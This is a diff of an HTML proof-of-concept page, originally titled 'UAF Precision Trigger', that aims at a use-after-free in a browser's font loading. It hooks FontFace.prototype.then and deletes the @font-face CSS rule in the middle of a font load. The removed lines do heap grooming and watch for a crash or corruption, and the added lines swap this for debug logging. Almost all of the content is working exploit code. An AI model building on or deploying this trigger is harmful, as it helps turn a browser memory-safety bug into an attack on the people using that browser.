@@ -1,62 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>UAF Precision Trigger</title>
     <style id="s">
-        @font-face { 
-            font-family: 'x'; 
-            src: url(nonexistent-font.woff); 
-            unicode-range: U+0042; 
-        }
+        @font-face { font-family: 'x'; src: url(nonexistent.woff); unicode-range: U+0042; }
     </style>
 </head>
 <body>
-    <div id="debug" style="color: #0f0; font-family: monospace; font-size: 20px;">
-        Starting...
+    <div id="debug" style="color: #0f0; font-family: monospace; font-size: 18px; white-space: pre-wrap;">
+        [1] Script Starting...
     </div>
 
     <script>
         const debug = document.getElementById('debug');
+        
+        function log(msg) {
+            debug.innerText += "\n[+] " + msg;
+        }
 
         window.onload = () => {
-            debug.innerText = "Script Initialized.";
+            try {
+                log("Script Loaded.");
+                
+                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                document.fonts.add(A);
+                log("FontFace added to document.fonts.");
 
-            // كائن FontFace الأساسي
-            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-            document.fonts.add(A);
-            void A.loaded;
-
-            let fired = false;
-
-            // الاعتراض الجراحي (Precision Hooking)
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        debug.innerText = "HOOK TRIGGERED!";
-                        
-                        // Grooming بسيط وغير مستنزف للذاكرة
-                        // ننشئ كائنين فقط لترتيب الـ Heap حول مكان الحذف
-                        new FontFace('y', 'local(Helvetica Bold)');
-                        new FontFace('z', 'local(Helvetica Italic)');
-                        
-                        // الحذف الجراحي
-                        document.getElementById('s').sheet.deleteRule(0);
-                        
-                        // Trigger الـ Layout لضمان التنفيذ الفوري
-                        document.body.offsetTop;
-                        
-                        debug.innerText = "Trigger Executed. Monitoring for Crash/Corruption...";
+                let fired = false;
+                
+                // تشخيص الـ Hook
+                Object.defineProperty(FontFace.prototype, 'then', {
+                    configurable: true,
+                    get() {
+                        if (!fired && this === A) {
+                            fired = true;
+                            log("HOOK TRIGGERED! (Object detected)");
+                            
+                            // الحذف
+                            document.getElementById('s').sheet.deleteRule(0);
+                            log("Rule deleted.");
+                            
+                            document.body.offsetTop;
+                            log("Layout forced.");
+                        }
+                        return undefined;
                     }
-                    return undefined;
-                }
-            });
+                });
+                log("Hook applied to prototype.");
 
-            // البدء بالتحميل
-            document.fonts.load('1em x', 'AB').catch((e) => {
-                debug.innerText = "Finished. Status: " + e.message;
-            });
+                log("Calling fonts.load...");
+                document.fonts.load('1em x', 'AB').then(() => {
+                    log("Load completed.");
+                }).catch((e) => {
+                    log("Load caught error: " + e.message);
+                });
+
+            } catch (err) {
+                log("CRITICAL ERROR: " + err.message);
+            }
         };
     </script>
 </body>
